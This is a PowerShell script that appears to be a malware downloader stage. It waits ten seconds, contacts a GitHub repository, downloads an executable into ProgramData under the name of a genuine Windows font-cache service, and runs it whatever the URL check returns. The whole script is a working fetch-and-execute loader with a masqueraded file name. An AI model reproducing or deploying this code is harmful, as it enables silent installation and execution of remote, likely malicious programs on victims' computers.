Start-Sleep -s 10
# Set the TLS protocol version
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URL
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$url_exe = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
$file_exe = "C:\ProgramData\PresentationFontCache.exe"


# Check if the URL exists
$response = Invoke-WebRequest -Uri $url_text -UseBasicParsing
if ($response.StatusCode -eq 200) {
    Write-Host "The URL '$url_text' exists."
    if (Test-Path $file_exe) {
        # Run the exe file
        Start-Process -FilePath $file_exe
    } else {
        # Download the exe file
        try {
            $down = New-Object System.Net.WebClient
            $down.DownloadFile($url_exe,$file_exe)
            # Run the exe file
            Start-Process -FilePath $file_exe
        }
        catch {
            Write-Host "Error downloading the file: $_.Exception.Message"
        }
    }
    
} else {
    Write-Host "The URL '$url_text' does not exist."
    try {
        $down = New-Object System.Net.WebClient
        $down.DownloadFile($url_exe,$file_exe)
        # Run the exe file
        Start-Process -FilePath $file_exe
    }
    catch {
        Write-Host "Error downloading the file: $_.Exception.Message"
    }
}

# Exit the script
exit
